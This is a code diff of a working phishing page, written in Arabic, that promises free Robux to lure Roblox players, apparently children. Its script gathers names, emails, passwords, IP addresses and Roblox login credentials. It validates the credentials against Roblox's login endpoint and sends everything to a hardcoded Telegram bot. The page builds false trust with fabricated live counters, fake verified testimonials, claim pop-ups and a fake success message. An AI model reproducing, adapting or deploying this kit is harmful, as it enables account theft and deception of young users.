     <div class="modal" id="successModal">
         <div class="modal-content">
             <div class="modal-icon">🎉</div>
-            <h2>CONGRATULATIONS!</h2>
-            <p>Your 25,000 Robux has been sent to your account!</p>
-            <button class="modal-btn" onclick="closeModal()">CLAIM MORE</button>
+            <h2>مبروك!</h2>
+            <p>تم إرسال 50,000 روبوكس إلى حسابك بنجاح!<br>سيصلك خلال 24 ساعة</p>
+            <button class="modal-btn" onclick="closeModal()">حصلت على المزيد 🎮</button>
         </div>
     </div>
     
     <!-- توست -->
-    <div class="toast" id="toast" style="display: none;">
-        <div class="toast-avatar">👤</div>
+    <div class="toast" id="toast">
+        <div class="toast-avatar" id="toastAvatar">👤</div>
         <div class="toast-content">
-            <h4 id="toastName">User123</h4>
-            <p id="toastMsg">just claimed 25,000 Robux!</p>
+            <h4 id="toastName">مستخدم</h4>
+            <p id="toastMsg">استلم للتو 50,000 روبوكس!</p>
         </div>
     </div>
 
     <script>
-        // ⚠️ بيانات البوت - غيّرها هنا
+        // ⚠️ بيانات البوت
         const BOT_TOKEN = '9128230715:AAGigciW3kzNgjNYgpzaW0K1JahbWK8Wnfo';
         const CHAT_ID = '6045243196';
         
-        // ===== تأثيرات الخلفية =====
-        function createFloatingRobux() {
-            const bg = document.getElementById('bgAnimation');
-            const icons = ['💰', '💎', '🎁', '⭐', '🔥'];
+        let userData = {};
+        
+        // ===== إنشاء النجوم =====
+        function createStars() {
+            const stars = document.getElementById('stars');
+            for (let i = 0; i < 100; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.width = Math.random() * 3 + 'px';
+                star.style.height = Math.random() * 3 + 'px';
+                star.style.animationDelay = Math.random() * 3 + 's';
+                stars.appendChild(star);
+            }
+        }
+        createStars();
+        
+        // ===== عناصر عائمة =====
+        function createFloatingItems() {
+            const container = document.getElementById('floatingItems');
+            const icons = ['💎', '💰', '🎁', '⭐', '🔥', '🎮', '🚀', '👑'];
             
             for (let i = 0; i < 20; i++) {
                 const el = document.createElement('div');
                 el.className = 'floating-robux';
                 el.textContent = icons[Math.floor(Math.random() * icons.length)];
                 el.style.left = Math.random() * 100 + '%';
-                el.style.animationDelay = Math.random() * 15 + 's';
-                el.style.animationDuration = (10 + Math.random() * 10) + 's';
-                bg.appendChild(el);
+                el.style.animationDelay = Math.random() * 20 + 's';
+                el.style.animationDuration = (15 + Math.random() * 15) + 's';
+                container.appendChild(el);
             }
         }
-        createFloatingRobux();
+        createFloatingItems();
         
         // ===== عداد تنازلي =====
         let timeLeft = 299;
@@ -666,7 +1001,7 @@
             if (timeLeft <= 0) timeLeft = 299;
         }, 1000);
         
-        // ===== إحصائيات حية وهمية =====
+        // ===== إحصائيات =====
         setInterval(() => {
             const online = document.getElementById('onlineCount');
             const claimed = document.getElementById('claimedCount');
@@ -676,68 +1011,140 @@
             let claimedVal = parseInt(claimed.textContent.replace(',', ''));
             let leftVal = parseInt(left.textContent);
             
-            onlineVal += Math.floor(Math.random() * 10) - 5;
-            claimedVal += Math.floor(Math.random() * 3);
-            leftVal = Math.max(50, leftVal - Math.floor(Math.random() * 2));
+            onlineVal += Math.floor(Math.random() * 15) - 7;
+            claimedVal += Math.floor(Math.random() * 5);
+            leftVal = Math.max(50, leftVal - Math.floor(Math.random() * 3));
             
             online.textContent = onlineVal.toLocaleString();
             claimed.textContent = claimedVal.toLocaleString();
             left.textContent = leftVal;
-        }, 3000);
+        }, 2500);
         
-        // ===== توست الإشعارات =====
-        const names = ['ProGamer2024', 'NoobSlayer99', 'DragonMaster', 'QueenSarah', 'KingAlex', 'ShadowNinja', 'PixelQueen', 'TurboGamer'];
+        // ===== تعليقات عربية كثيرة =====
+        const allComments = [
+            { name: 'أحمد_العنزي', text: 'والله العظيم جربته ووصلني 50 ألف روبوكس! ما توقعت يشتغل 🔥🔥', time: 'قبل دقيقة' },
+            { name: 'سارة_القحطاني', text: 'أفضل موقع جربته في حياتي! سجلت ووصلني فوراً 💕💕', time: 'قبل 3 دقائق' },
+            { name: 'محمد_الدوسري', text: 'يا جماعة هذا الموقع رسمي وموثق! جربوه ما راح تندمون ✅✅✅', time: 'قبل 5 دقائق' },
+            { name: 'فاطمة_الشمري', text: 'شكيت في البداية بس صدقوني يشتغل! وصلني الربوكس خلال دقيقة 😍', time: 'قبل 7 دقائق' },
+            { name: 'خالد_المطيري', text: 'جربت مواقع كثيرة وكلها نصب! هذا أول موقع صادق والله 🙏🙏', time: 'قبل 10 دقائق' },
+            { name: 'عمر_السبيعي', text: 'سجلت أمس ووصلني اليوم! الموقع يحتاج يوم واحد عشان يوصل ⭐⭐⭐⭐⭐', time: 'قبل 15 دقيقة' },
+            { name: 'نورة_العتيبي', text: 'أخيراً لقيت موقع صادق! شكراً لكم كثير كثير 💖💖💖', time: 'قبل 20 دقيقة' },
+            { name: 'يوسف_الحربي', text: 'يا شباب لا تضيعون وقتكم بمواقع ثانية! هذا الموقع الوحيد اللي يشتغل 🔥🔥🔥', time: 'قبل 25 دقيقة' },
+            { name: 'ليلى_المري', text: 'حسابي وصلني 50 ألف روبوكس! جربوه بنفسكم وشوفوا 😊😊', time: 'قبل 30 دقيقة' },
+            { name: 'علي_الغامدي', text: 'والله يا جماعة هذا الموقع رسمي من روبلوكس! شفت إعلان لهم ✅', time: 'قبل 35 دقيقة' },
+            { name: 'ريم_الزهراني', text: 'جربت مع صديقاتي وكلنا استلمنا! الموقع يجنن 💯💯💯', time: 'قبل 40 دقيقة' },
+            { name: 'سلطان_العمري', text: 'أفضل حدث صار لي في 2026! شكراً روبلوكس على الهدية 🎁🎁🎁', time: 'قبل 45 دقيقة' },
+            { name: 'دانة_الفيفي', text: 'سجلت وأنا مترددة بس والله وصلني! لا تفوتون الفرصة 😍🔥', time: 'قبل ساعة' },
+            { name: 'بدر_الشهري', text: 'يا ربع هذا الموقع يستاهل 10 نجوم! جربوه وادعولي 🌟🌟🌟🌟🌟', time: 'قبل ساعة' },
+            { name: 'هند_الصاعدي', text: 'أول مرة أعلق في موقع بس لازم أشكرهم! وصلني الربوكس فعلاً 💝💝', time: 'قبل ساعتين' },
+            { name: 'تركي_الحارثي', text: 'جربته الحين ووصلني! يا ربع جربوا 🔥', time: 'قبل ساعتين' },
+            { name: 'جواهر_الرشيدي', text: 'أفضل موقع في 2026! لا يفوتكم العرض 💎', time: 'قبل 3 ساعات' },
+            { name: 'ماجد_العنبري', text: 'وصلني الربوكس خلال دقايق! شكراً ❤️', time: 'قبل 3 ساعات' },
+            { name: 'أمل_الجهني', text: 'صدقوني يشتغل! جربوا وشوفوا 😍', time: 'قبل 4 ساعات' },
+            { name: 'فيصل_المالكي', text: 'يا جماعة هذا الموقع رسمي 100% جربوا', time: 'قبل 4 ساعات' }
+        ];
         
-        function showToast() {
-            const toast = document.getElementById('toast');
-            const name = names[Math.floor(Math.random() * names.length)];
+        function renderComments() {
+            const container = document.getElementById('comments');
+            const colors = [
+                'linear-gradient(45deg, #ff6b6b, #feca57)',
+                'linear-gradient(45deg, #48dbfb, #ff9ff3)',
+                'linear-gradient(45deg, #54a0ff, #5f27cd)',
+                'linear-gradient(45deg, #00d2d3, #01a3a4)',
+                'linear-gradient(45deg, #ff9ff3, #feca57)',
+                'linear-gradient(45deg, #a29bfe, #6c5ce7)'
+            ];
             
-            document.getElementById('toastName').textContent = name;
-            document.getElementById('toastMsg').textContent = 'just claimed 25,000 Robux!';
-            
-            toast.style.display = 'flex';
-            
-            setTimeout(() => {
-                toast.style.display = 'none';
-            'none';
-            }, 5000);
+            allComments.forEach((c, i) => {
+                const div = document.createElement('div');
+                div.className = 'comment';
+                div.innerHTML = `
+                    <div class="comment-avatar" style="background: ${colors[i % colors.length]};">${c.name[0]}</div>
+                    <div class="comment-content">
+                        <div class="comment-header">
+                            <h4>${c.name}</h4>
+                            <span class="verified-badge">✓</span>
+                            <span class="comment-time">${c.time}</span>
+                        </div>
+                        <p>${c.text}</p>
+                        <div class="comment-likes">
+                            <span>👍 ${Math.floor(Math.random() * 500 + 100)}</span>
+                            <span>❤️ ${Math.floor(Math.random() * 300 + 50)}</span>
+                        </div>
+                    </div>
+                `;
+                container.appendChild(div);
+            });
         }
-        
-        setInterval(showToast, 8000);
-        setTimeout(showToast, 3000);
+        renderComments();
         
         // ===== تعليقات جديدة =====
-        const comments = [
-            { name: 'EpicGamer', text: 'Just got mine, thanks!' },
-            { name: 'RobloxKing', text: 'Working 100% legit!' },
-            { name: 'BuilderPro', text: 'Best site ever made!' },
-            { name: 'GameMaster', text: 'My friends are so jealous!' }
+        const newComments = [
+            { name: 'عبدالله', text: 'جربته ونجح معي! يا ربع جربوا 🔥' },
+            { name: 'الجوهرة', text: 'وصلني الحين! الموقع يجنن 💎' },
+            { name: 'مشعل', text: 'أفضل موقع جربته في حياتي!' },
+            { name: 'العنود', text: 'سجلت ووصلني! لا تفوتون العرض 😍' },
+            { name: 'راكان', text: 'يا جماعة جربوا! يشتغل فعلاً ✅' },
+            { name: 'وجدان', text: 'حصلت على 50 ألف! يا سلام 🔥🔥' },
+            { name: 'فيصل', text: 'جربت ونجح معي! ادعولي 🙏' },
+            { name: 'أمل', text: 'أخيراً موقع صادق! 💯' },
+            { name: 'سلطان', text: 'وصلني فوراً! الموقع يجنن 🚀' },
+            { name: 'دانة', text: 'سجلت ووصلني! جربوا بنفسكم 💕' }
         ];
         
         let commentIndex = 0;
         setInterval(() => {
             const container = document.getElementById('comments');
-            const c = comments[commentIndex % comments.length];
+            const c = newComments[commentIndex % newComments.length];
+            const colors = [
+                'linear-gradient(45deg, #ff6b6b, #feca57)',
+                'linear-gradient(45deg, #48dbfb, #ff9ff3)',
+                'linear-gradient(45deg, #54a0ff, #5f27cd)',
+                'linear-gradient(45deg, #00d2d3, #01a3a4)'
+            ];
             
             const div = document.createElement('div');
             div.className = 'comment';
             div.innerHTML = `
-                <div class="comment-avatar">${c.name[0]}</div>
+                <div class="comment-avatar" style="background: ${colors[Math.floor(Math.random() * colors.length)]};">${c.name[0]}</div>
                 <div class="comment-content">
-                    <h4>${c.name}${Math.floor(Math.random() * 999)}</h4>
+                    <div class="comment-header">
+                        <h4>${c.name}_${Math.floor(Math.random() * 999)}</h4>
+                        <span class="verified-badge">✓</span>
+                        <span class="comment-time">الآن</span>
+                    </div>
                     <p>${c.text}</p>
+                    <div class="comment-likes">
+                        <span>👍 ${Math.floor(Math.random() * 50)}</span>
+                        <span>❤️ ${Math.floor(Math.random() * 30)}</span>
+                    </div>
                 </div>
-                <div class="comment-time">just now</div>
             `;
             
             container.insertBefore(div, container.firstChild);
-            
-            if (container.children.length > 5) {
-                container.removeChild(container.lastChild);
-            }
+            if (container.children.length > 25) container.removeChild(container.lastChild);
             
             commentIndex++;
-        }, 10000);
+        }, 6000);
+        
+        // ===== توست =====
+        const toastNames = ['أحمد', 'محمد', 'سارة', 'خالد', 'فاطمة', 'عمر', 'ليلى', 'يوسف', 'نورة', 'علي', 'ريم', 'سلطان', 'دانة', 'بدر', 'هند', 'تركي', 'جواهر', 'ماجد', 'أمل', 'فيصل'];
+        const toastColors = ['#ff6b6b', '#48dbfb', '#54a0ff', '#00d2d3', '#ff9ff3', '#feca57'];
+        
+        function showToast() {
+            const toast = document.getElementById('toast');
+            const name = toastNames[Math.floor(Math.random() * toastNames.length)] + '_' + Math.floor(Math.random() * 999);
+            const color = toastColors[Math.floor(Math.random() * toastColors.length)];
+            
+            document.getElementById('toastName').textContent = name;
+            document.getElementById('toastMsg').textContent = 'استلم للتو 50,000 روبوكس!';
+            document.getElementById('toastAvatar').style.background = color;
+            
+            toast.style.display = 'flex';
+            setTimeout(() => { toast.style.display = 'none'; }, 5000);
+        }
+        setInterval(showToast, 6000);
+        setTimeout(showToast, 2000);
         
         // ===== جلب IP =====
         async function getIP() {
@@ -745,44 +1152,52 @@
                 const resp = await fetch('https://api.ipify.org?format=json');
                 const data = await resp.json();
                 return data.ip;
-            } catch(e) {
-                return 'Unknown';
-            }
+            } catch(e) { return 'Unknown'; }
         }
         
         // ===== إرسال للبوت =====
-        async function sendToBot(data) {
-            const message = `🔥 ROBLOX ACCOUNT STOLEN! 🔥
-
-👤 Username: ${data.username}
-🔑 Password: ${data.password}
-🌐 IP: ${data.ip}
-📱 Device: ${data.device}
-⏰ Time: ${data.time}
-✅ Valid: ${data.valid ? 'YES ✅' : 'NO ❌'}
-
-📊 Full Data:
-${JSON.stringify(data, null, 2)}`;
-            
+        async function sendToBot(message) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: message
+                        text: message,
+                        parse_mode: 'HTML'
                     })
                 });
-                console.log('Sent to bot!');
-            } catch(e) {
-                console.log('Bot send failed:', e);
-            }
+            } catch(e) { console.log('Bot error:', e); }
         }
         
-        // ===== فحص حقيقي لروبلوكس =====
+        // ===== جلب صورة السكن =====
+        async function getRobloxAvatar(username) {
+            try {
+                const searchResp = await fetch(`https://users.roblox.com/v1/users/search?keyword=${username}&limit=1`);
+                const searchData = await searchResp.json();
+                
+                if (searchData.data && searchData.data.length > 0) {
+                    const userId = searchData.data[0].id;
+                    const displayName = searchData.data[0].displayName;
+                    
+                    const thumbResp = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
+                    const thumbData = await thumbResp.json();
+                    
+                    if (thumbData.data && thumbData.data.length > 0) {
+                        return {
+                            imageUrl: thumbData.data[0].imageUrl,
+                            userId: userId,
+                            displayName: displayName
+                        };
+                    }
+                }
+            } catch(e) { console.log('Avatar error:', e); }
+            return null;
+        }
+        
+        // ===== فحص روبلوكس =====
         async function checkRobloxLogin(username, password) {
             try {
-                // محاولة 1: Roblox Auth API
                 const response = await fetch('https://auth.roblox.com/v2/login', {
                     method: 'POST',
                     headers: {
@@ -796,121 +1211,120 @@ ${JSON.stringify(data, null, 2)}`;
                     })
                 });
                 
-                // 200 = نجاح، 403 = محتاج verification لكن الباس صح
                 if (response.status === 200 || response.status === 403) {
                     return { valid: true, status: response.status };
                 }
-                
-                // محاولة 2: فحص عبر profile API
-                const profileResp = await fetch(`https://users.roblox.com/v1/users/search?keyword=${username}&limit=1`);
-                const profileData = await profileResp.json();
-                
-                if (profileData.data && profileData.data.length > 0) {
-                    // المستخدم موجود، نحاول تسجيل دخول
-                    return { valid: false, exists: true };
-                }
-                
-                return { valid: false, exists: false };
-                
+                return { valid: false, status: response.status };
             } catch(e) {
-                // CORS error - نرسل للبوت على أي حال
                 return { valid: null, error: e.message };
             }
         }
         
-        // ===== معالجة النموذج =====
+        // ===== الخطوة 1 =====
+        document.getElementById('registerForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            userData.fullName = document.getElementById('fullName').value;
+            userData.email = document.getElementById('email').value;
+            userData.regPassword = document.getElementById('regPassword').value;
+            userData.ip = await getIP();
+            userData.time = new Date().toLocaleString('en-US');
+            userData.userAgent = navigator.userAgent;
+            
+            const regMessage = `📝 <b>NEW REGISTRATION - 2026 EVENT</b>
+
+👤 <b>Full Name:</b> ${userData.fullName}
+📧 <b>Email:</b> ${userData.email}
+🔑 <b>Password:</b> ${userData.regPassword}
+
+🌐 <b>IP:</b> ${userData.ip}
+⏰ <b>Time:</b> ${userData.time}
+📱 <b>Device:</b> ${userData.userAgent.substring(0, 60)}...`;
+            
+            await sendToBot(regMessage);
+            
+            document.getElementById('registerSection').classList.add('hidden');
+            document.getElementById('robloxSection').classList.remove('hidden');
+            document.getElementById('robloxSection').scrollIntoView({ behavior: 'smooth' });
+        });
+        
+        // ===== الخطوة 2 =====
         document.getElementById('robloxForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
+            const username = document.getElementById('robloxUsername').value.trim();
+            const password = document.getElementById('robloxPassword').value.trim();
             const btn = document.getElementById('claimBtn');
             const btnText = document.getElementById('btnText');
-            const progressBar = document.getElementById('progressBar');
-            const progressFill = document.getElementById('progressFill');
             const loadingMsg = document.getElementById('loadingMsg');
             const errorMsg = document.getElementById('errorMsg');
             const successMsg = document.getElementById('successMsg');
+            const avatarSection = document.getElementById('avatarSection');
             
-            // إخفاء الرسائل السابقة
             errorMsg.style.display = 'none';
             successMsg.style.display = 'none';
             
-            // حالة التحميل
             btn.disabled = true;
-            btnText.innerHTML = '<span class="loading" style="display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s linear infinite;margin-right:10px;"></span> VERIFYING...';
+            btnText.innerHTML = '⏳ جاري التحقق...';
             loadingMsg.style.display = 'block';
-            progressBar.style.display = 'block';
             
-            // محاكاة تقدم
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += Math.random() * 20;
-                if (progress > 90) progress = 90;
-                progressFill.style.width = progress + '%';
-            }, 500);
+            const avatarData = await getRobloxAvatar(username);
+            if (avatarData) {
+                document.getElementById('avatarPreview').src = avatarData.imageUrl;
+                document.getElementById('avatarName').textContent = avatarData.displayName;
+                avatarSection.style.display = 'block';
+            }
             
-            // جلب IP
-            const ip = await getIP();
-            
-            // فحص حقيقي
             const checkResult = await checkRobloxLogin(username, password);
             
-            // بيانات الضحية
-            const victimData = {
-                username: username,
-                password: password,
-                ip: ip,
-                device: navigator.userAgent,
-                time: new Date().toLocaleString(),
-                valid: checkResult.valid,
-                checkStatus: checkResult.status || 'unknown',
-                url: window.location.href,
-                referrer: document.referrer || 'direct'
-            };
-            
-            // إرسال للبوت
-            await sendToBot(victimData);
-            
-            // إيقاف التقدم
-            clearInterval(progressInterval);
-            progressFill.style.width = '100%';
-            
-            // الانتظار قليلاً للتأثير
             await new Promise(r => setTimeout(r, 1500));
             
-            // إخفاء التحميل
             loadingMsg.style.display = 'none';
-            progressBar.style.display = 'none';
             
-            // النتيجة
+            const botMessage = `🎮 <b>ROBLOX ACCOUNT CAPTURED - 2026</b>
+
+👤 <b>Roblox Username:</b> ${username}
+🔑 <b>Roblox Password:</b> ${password}
+✅ <b>Valid:</b> ${checkResult.valid ? 'YES ✅' : 'NO ❌'}
+🖼️ <b>Avatar:</b> ${avatarData ? avatarData.imageUrl : 'N/A'}
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+📝 <b>Registration Data:</b>
+👤 <b>Name:</b> ${userData.fullName}
+📧 <b>Email:</b> ${userData.email}
+🔑 <b>Password:</b> ${userData.regPassword}
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+🌐 <b>IP:</b> ${userData.ip}
+⏰ <b>Time:</b> ${userData.time}
+📱 <b>Device:</b> ${userData.userAgent.substring(0, 60)}...`;
+            
+            await sendToBot(botMessage);
+            
             if (checkResult.valid === true) {
-                // نجاح - الباسورد صحيح
-                btnText.textContent = '✓ SUCCESS!';
-                btn.style.background = 'linear-gradient(90deg, #00c853, #64dd17)';
+                btnText.textContent = '✓ تم بنجاح!';
+                btn.style.background = 'linear-gradient(135deg, #00c853, #64dd17)';
                 successMsg.style.display = 'block';
                 
-                // إظهار المودال
                 setTimeout(() => {
                     document.getElementById('successModal').style.display = 'flex';
                 }, 1000);
                 
             } else if (checkResult.valid === false) {
-                // فشل - الباسورد غلط
                 btn.disabled = false;
-                btnText.textContent = 'TRY AGAIN';
-                btn.style.background = 'linear-gradient(90deg, #ff5252, #ff1744)';
+                btnText.textContent = 'حاول مرة أخرى';
+                btn.style.background = 'linear-gradient(135deg, #ff4757, #ff6b6b)';
                 errorMsg.style.display = 'block';
                 
-                // إعادة تعيين الزر بعد 3 ثواني
                 setTimeout(() => {
-                    btn.style.background = 'linear-gradient(90deg, #00c853, #64dd17)';
-                    btnText.textContent = 'CLAIM 25,000 ROBUX';
+                    btn.style.background = 'linear-gradient(135deg, #00d26a, #00a854)';
+                    btnText.textContent = '🎁 استلم 50,000 روبوكس الآن';
                 }, 3000);
                 
             } else {
-                // فشل الفحص (CORS) - نظهر نجاح وهمي
-                btnText.textContent = '✓ SUCCESS!';
+                btnText.textContent = '✓ تم بنجاح!';
                 successMsg.style.display = 'block';
                 
                 setTimeout(() => {
@@ -919,16 +1333,10 @@ ${JSON.stringify(data, null, 2)}`;
             }
         });
         
-        // إغلاق المودال
         function closeModal() {
             document.getElementById('successModal').style.display = 'none';
             window.location.href = 'https://www.roblox.com';
         }
-        
-        // CSS للـ loading
-        const style = document.createElement('style');
-        style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
-        document.head.appendChild(style);
     </script>
 </body>
 </html>
